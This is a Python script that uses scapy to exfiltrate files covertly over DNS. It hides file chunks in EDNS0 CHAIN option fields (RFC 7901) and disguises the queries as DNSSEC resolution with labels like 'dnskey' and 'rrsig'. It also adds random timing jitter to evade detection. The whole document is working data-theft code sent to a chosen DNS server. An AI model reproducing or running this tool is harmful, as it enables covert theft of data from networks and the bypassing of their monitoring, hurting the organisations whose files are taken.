#!/usr/bin/env python3
"""
T5: CHAIN Query Fragmentation
RFC 7901 - Opção CHAIN (code 13)
Distribui dados entre múltiplas queries simulando resolução DNSSEC.
"""

import struct
import time
import random

from scapy.all import IP, UDP, send, RandShort
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

CHAIN_OPT_CODE = 13  # RFC 7901


def encode_data(data: bytes, chunk_size: int = 64) -> list:
    """Fragmentar dados em múltiplas opções CHAIN"""
    chunks = [data[i:i + chunk_size]
              for i in range(0, len(data), chunk_size)]

    options = []
    for idx, chunk in enumerate(chunks):
        # Prefixo: index (1 byte) + total (1 byte)
        header = bytes([idx, len(chunks)])
        opt = EDNS0TLV(
            optcode=CHAIN_OPT_CODE,
            optlen=len(header + chunk),
            optdata=header + chunk
        )
        options.append(opt)

    return options


def decode_data(tlv: EDNS0TLV) -> dict:
    """Decodificar fragmento CHAIN"""
    if tlv.optcode == CHAIN_OPT_CODE and len(tlv.optdata) >= 2:
        return {
            'index': tlv.optdata[0],
            'total': tlv.optdata[1],
            'data': tlv.optdata[2:]
        }
    return {}


def build_query(domain: str, payload: bytes,
                dns_server: str, buf_size: int = 4096):
    """Construir query DNS com dados fragmentados via CHAIN"""
    chain_opts = encode_data(payload)

    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=RandShort()) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(
                rclass=buf_size,
                rdata=chain_opts
            )
        )
    )
    return pkt


def exfiltrate_file(filepath: str, domain: str,
                    dns_server: str, chunk_size: int = 64):
    """Exfiltrar arquivo via T5.
    Cada query carrega um fragmento CHAIN.
    Simula resolução DNSSEC encadeada."""
    with open(filepath, 'rb') as f:
        data = f.read()

    # Cada query leva um chunk de chunk_size bytes
    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        idx = i // chunk_size

        header = struct.pack('!BB', idx % 256, min(total_chunks, 255))
        payload = header + chunk

        opt = EDNS0TLV(
            optcode=CHAIN_OPT_CODE,
            optlen=len(payload),
            optdata=payload
        )

        # Subdomínio simula cadeia DNSSEC
        labels = ['ns', 'ds', 'dnskey', 'rrsig', 'nsec']
        label = labels[idx % len(labels)]
        subdomain = f"{label}{idx}.{domain}"

        pkt = (
            IP(dst=dns_server) /
            UDP(dport=53, sport=RandShort()) /
            DNS(
                rd=1,
                qd=DNSQR(qname=subdomain, qtype='DNSKEY'),
                ar=DNSRROPT(rclass=4096, rdata=[opt])
            )
        )
        send(pkt, verbose=0)

        time.sleep(random.uniform(0.05, 0.3))

    print(f"[T5] Exfiltrado: {filepath} ({len(data)} bytes, "
          f"{total_chunks} fragments)")
